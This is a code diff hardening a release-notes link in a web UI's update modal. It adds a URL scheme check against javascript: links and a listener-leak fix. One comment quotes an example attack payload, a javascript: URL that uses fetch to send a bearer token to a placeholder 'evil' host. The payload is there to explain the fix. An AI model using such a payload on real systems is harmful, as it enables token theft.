@@ -127,7 +127,7 @@
               + '<summary>Release notes</summary>'
               + '<pre>' + escapeHtml(env.releaseNotes) + '</pre>'
               + (env.htmlUrl
-                ? '<a href="' + escapeAttr(env.htmlUrl) + '" target="_blank" rel="noopener noreferrer">Open on GitHub →</a>'
+                ? '<a href="' + escapeAttr(safeExternalUrl(env.htmlUrl)) + '" target="_blank" rel="noopener noreferrer">Open on GitHub →</a>'
                 : '')
               + '</details>'
             : '';
@@ -192,6 +192,19 @@
         // card instance) as the rest of the file already does at lines
         // 51, 69, 168.
         var self = this;
+        // Race-conditions audit aaf1f87d, finding B12 — rapid re-clicks
+        // on the "View command" trigger previously did `removeChild` on
+        // the pre-existing modal node but never called the prior modal's
+        // `close()`, so the document-level keydown + Tab-trap listeners
+        // attached at lines 246+264 leaked one pair per re-open. Calling
+        // _modalClose first (the close() hook stored by the previous
+        // open) removes both listeners and restores focus to whatever
+        // had it before the FIRST open. If there is no prior modal,
+        // _modalClose is null and the cleanup is a no-op.
+        if (typeof this._modalClose === 'function') {
+            try { this._modalClose(); } catch (e) { /* prior modal already torn down */ }
+            this._modalClose = null;
+        }
         var prev = document.querySelector('.enm-tools-update-modal');
         if (prev) prev.parentNode.removeChild(prev);
 
@@ -218,7 +231,7 @@
             +       '<li>Health-checks for 24s; auto-rollback if the new binary doesn\'t come up.</li>'
             +     '</ul>'
             +     (env.htmlUrl
-                    ? '<p>Release notes: <a href="' + escapeAttr(env.htmlUrl) + '" target="_blank" rel="noopener noreferrer">' + escapeAttr(env.htmlUrl) + '</a></p>'
+                    ? '<p>Release notes: <a href="' + escapeAttr(safeExternalUrl(env.htmlUrl)) + '" target="_blank" rel="noopener noreferrer">' + escapeHtml(env.htmlUrl) + '</a></p>'
                     : '')
             +   '</details>'
             + '</div>';
@@ -361,6 +374,26 @@
         return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
             return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c];
         });
+    }
+    /**
+     * Sanitise a URL before rendering it as an `<a href>`. Returns the
+     * URL as-is if (a) it parses and (b) the scheme is one we trust.
+     * Returns '#' (a no-op anchor) otherwise. The previous version
+     * escaped the URL as HTML and called it safe; that does not prevent
+     * `javascript:` schemes because they contain no HTML-special
+     * characters. (Security audit aa5a9715: a compromised GitHub probe
+     * response could put `javascript:fetch('https://evil/x?t=' +
+     * location.search)` into env.htmlUrl and exfiltrate the owner
+     * bearer token on operator click.) We restrict to https + http for
+     * release-notes links — GitHub canonical is https://github.com/...
+     */
+    function safeExternalUrl(raw) {
+        if (raw == null || raw === '') { return '#'; }
+        var u;
+        try { u = new URL(String(raw)); }
+        catch (e) { return '#'; }
+        if (u.protocol !== 'https:' && u.protocol !== 'http:') { return '#'; }
+        return u.toString();
     }
     function relTime(ms) {
         if (!ms || typeof ms !== 'number') { return 'recently'; }
